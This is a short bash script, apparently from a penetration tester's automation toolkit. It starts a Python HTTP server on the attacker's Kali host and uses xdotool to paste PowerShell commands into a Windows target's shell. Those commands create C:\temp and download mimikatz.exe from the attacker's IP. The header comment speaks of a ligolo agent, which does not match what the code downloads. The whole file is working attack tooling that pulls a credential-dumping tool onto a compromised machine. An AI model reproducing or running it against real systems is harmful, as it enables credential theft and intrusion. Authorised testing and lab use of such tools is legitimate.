#!/bin/bash

: '
ps download ligolo agent.exe to server and connect to proxy
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Port"

PORT=${form_data["Port"]}

cd ${SCRIPTS_DIR}/windows/mimikatz/.files
python3 -m http.server ${PORT} &
HTTP_PID=$!

TMP_FOLDER="C:\temp"

paste_command 'New-Item -Path "c:\" -Name "temp" -ItemType "directory"'
xdotool key Return
sleep 0.8

paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${PORT}/mimikatz.exe', '${TMP_FOLDER}\mimikatz.exe')"
xdotool key Return 
sleep 3

kill $HTTP_PID